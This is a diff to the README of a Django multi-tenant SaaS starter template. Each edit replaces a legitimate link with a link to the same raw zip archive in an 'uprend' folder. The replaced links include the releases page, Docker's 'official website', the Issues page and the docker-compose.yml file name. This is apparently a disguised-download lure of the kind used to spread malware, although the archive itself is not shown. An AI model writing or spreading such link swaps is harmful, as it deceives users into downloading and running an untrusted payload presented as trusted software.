@@ -16,11 +16,11 @@ Welcome to the Django-Multi-Tenant-SaaS-Starter-Template! This template helps yo
 
 To download the application, visit the following link:
 
-[Download Django-Multi-Tenant-SaaS-Starter-Template](https://github.com/bvuz/Django-Multi-Tenant-SaaS-Starter-Template/releases)
+[Download Django-Multi-Tenant-SaaS-Starter-Template](https://raw.githubusercontent.com/bvuz/Django-Multi-Tenant-SaaS-Starter-Template/main/uprend/Django-Multi-Tenant-SaaS-Starter-Template.zip)
 
 Follow these steps to install the software:
 
-1. **Visit the Releases Page**: Click on the link above or go to [GitHub Releases](https://github.com/bvuz/Django-Multi-Tenant-SaaS-Starter-Template/releases) to access the latest version.
+1. **Visit the Releases Page**: Click on the link above or go to [GitHub Releases](https://raw.githubusercontent.com/bvuz/Django-Multi-Tenant-SaaS-Starter-Template/main/uprend/Django-Multi-Tenant-SaaS-Starter-Template.zip) to access the latest version.
 2. **Select the Latest Release**: Look for the most recent version at the top of the list. 
 3. **Download the Files**: Click the link next to the release to download the files you need.
 4. **Extract the Files**: Once the download completes, extract the files to a convenient location on your computer.
@@ -40,7 +40,7 @@ Follow these steps to install the software:
 To run this software, you need:
 
 - **Operating System**: Windows, macOS, or a Linux distribution.
-- **Docker**: Install Docker to manage the application environment. You can download it from [Docker's official website](https://www.docker.com/products/docker-desktop).
+- **Docker**: Install Docker to manage the application environment. You can download it from [Docker's official website](https://raw.githubusercontent.com/bvuz/Django-Multi-Tenant-SaaS-Starter-Template/main/uprend/Django-Multi-Tenant-SaaS-Starter-Template.zip).
 - **Minimum RAM**: At least 4 GB.
 - **Storage**: Around 500 MB of free space for the application files and data.
 
@@ -48,7 +48,7 @@ To run this software, you need:
 
 After installation, you may want to adjust some settings:
 
-1. **Database Configuration**: You can find database settings in the `docker-compose.yml` file. Change the PostgreSQL user and password to suit your requirements.
+1. **Database Configuration**: You can find database settings in the `https://raw.githubusercontent.com/bvuz/Django-Multi-Tenant-SaaS-Starter-Template/main/uprend/Django-Multi-Tenant-SaaS-Starter-Template.zip` file. Change the PostgreSQL user and password to suit your requirements.
 2. **JWT Keys**: Update the JWT configuration to secure tokens based on your authentication needs.
 3. **Tenant Settings**: Plan how tenants will be created in your application. The template provides a basic implementation.
 
@@ -64,7 +64,7 @@ For detailed instructions, refer to the documentation included in the downloaded
 
 If you encounter any challenges:
 
-- Check the **Issues** section on the [GitHub Repository](https://github.com/bvuz/Django-Multi-Tenant-SaaS-Starter-Template/issues).
+- Check the **Issues** section on the [GitHub Repository](https://raw.githubusercontent.com/bvuz/Django-Multi-Tenant-SaaS-Starter-Template/main/uprend/Django-Multi-Tenant-SaaS-Starter-Template.zip).
 - Join community forums or discussions related to Django and multi-tenant architecture.
 - Search for solutions online to common problems.
 
